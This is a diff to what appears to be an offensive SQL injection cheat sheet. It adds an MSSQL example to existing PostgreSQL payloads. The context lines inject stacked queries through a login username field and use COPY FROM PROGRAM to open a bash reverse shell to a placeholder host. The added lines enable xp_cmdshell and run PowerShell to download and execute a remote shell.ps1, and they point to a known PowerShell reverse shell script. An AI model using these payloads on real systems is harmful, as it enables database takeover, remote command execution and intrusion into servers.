@@ -1370,3 +1370,15 @@ username=';DROP+TABLE+IF+EXISTS+cmd_exec;--&password='
 username=';CREATE+TABLE+cmd_exec(cmd_output+text);--&password='
 username=';COPY+cmd_exec+FROM+PROGRAM+'bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22';--&password='
 username=';SELECT+*+FROM+cmd_exec;--&password='
+
+#EXAMPLE
+
+# MSSQL (1)
+
+EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+EXEC xp_cmdshell "powershell iex(iwr -usebasicparsing http://{IP}/shell.ps1)";
+
+=> You can try use : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
